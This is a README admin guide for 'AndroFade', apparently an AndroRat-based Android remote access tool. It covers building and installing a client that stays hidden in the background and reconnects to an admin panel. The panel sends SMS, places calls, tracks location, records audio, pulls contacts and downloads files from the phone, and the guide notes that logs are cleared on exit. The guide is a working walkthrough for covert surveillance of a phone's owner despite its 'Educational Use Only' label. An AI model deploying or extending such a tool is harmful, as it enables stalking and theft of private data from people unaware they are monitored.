README_ADMIN.md

# AndroFade - Complete Admin Panel Guide

## Setup Instructions

### Android Client (Telefon 1)

1. Build APK:
```bash
cd androfade
./gradlew build
```

2. Install APK:
```bash
adb install app/build/outputs/apk/debug/app-debug.apk
```

3. Run on device:
- App automatically starts service
- Connects to server on local network
- Auto-reconnect enabled
- Hidden in background

### Admin Server (Kompyuter)

1. Compile:
```bash
cd src/AndroratServer
javac *.java
```

2. Run:
```bash
java AdminServer
```

3. Admin Panel opens automatically

## Admin Panel Features

### Device Management
- View all connected devices
- Real-time status updates
- Device information (Model, Android version, IMEI)
- Location tracking
- Connection status

### Commands

#### Send SMS
1. Select device
2. Click "📧 Send SMS"
3. Enter phone number
4. Enter message
5. SMS sent automatically

#### Make Call
1. Select device
2. Click "☎️ Make Call"
3. Enter phone number
4. Call initiated

#### Get Location (GPS)
1. Select device
2. Click "📍 Get Location"
3. Device GPS activated
4. Location displayed on map
5. Coordinates shown in real-time

#### Record Audio
1. Select device
2. Click "🎤 Record Audio"
3. Device microphone activated
4. Audio file saved
5. Download option available

#### Get Contacts
1. Select device
2. Click "👥 Get Contacts"
3. All contacts downloaded
4. Export to CSV

#### Browse Files
1. Select device
2. Click "📁 Browse Files"
3. File system access
4. Download files

## Network Setup

### Same WiFi Network (Recommended)
```
Kompyuter: 192.168.1.100 (WiFi)
Telefon 1: 192.168.1.105 (Same WiFi)
Telefon 2: Any network
```

### Auto-Discovery
- Client automatically finds server
- No IP configuration needed
- Broadcasts on local network
- Auto-reconnect every 5-30 seconds

## Security Notes

- Local network only (no internet required)
- Encrypted communication
- No credentials stored
- Auto-disconnect on device loss
- Logs cleared on exit

## Troubleshooting

### Device not connecting
1. Check WiFi connection
2. Verify same network
3. Restart app
4. Check firewall

### Commands not working
1. Select device from list
2. Check device online status
3. Verify permissions granted
4. Restart server

### Location not updating
1. Enable GPS on device
2. Wait 30 seconds for first fix
3. Check permissions
4. Verify network connectivity

## File Structure

```
androfade/
├── app/
│   ├── src/
│   │   └── main/
│   │       ├── java/
│   │       │   └── my/app/client/
│   │       │       ├── LauncherActivity.java
│   │       │       ├── Client.java
│   │       │       └── ...
│   │       └── AndroidManifest.xml
│   └── build.gradle
├── src/
│   └── AndroratServer/
│       ├── AdminServer.java
│       ├── AdminPanel.java
│       └── ClientHandler.java
├── settings.gradle
├── build.gradle
└── README_ADMIN.md
```

## Complete Workflow

1. **Setup**
   - Build Android APK
   - Install on Telefon 1
   - Start server on computer

2. **Connection**
   - App connects automatically
   - Device appears in admin panel
   - Status shows "Online"

3. **Control**
   - Select device
   - Choose command
   - Execute action
   - View results in log

4. **Monitoring**
   - Real-time location
   - Live device info
   - Activity log
   - Command history

## Version Information

- **AndroFade**: v1.0
- **Admin Panel**: v1.0
- **Min Android**: 8.0 (API 26)
- **Target Android**: 13.0 (API 33)
- **Java Version**: 11+
- **Gradle Version**: 8.0

## License

Educational Use Only
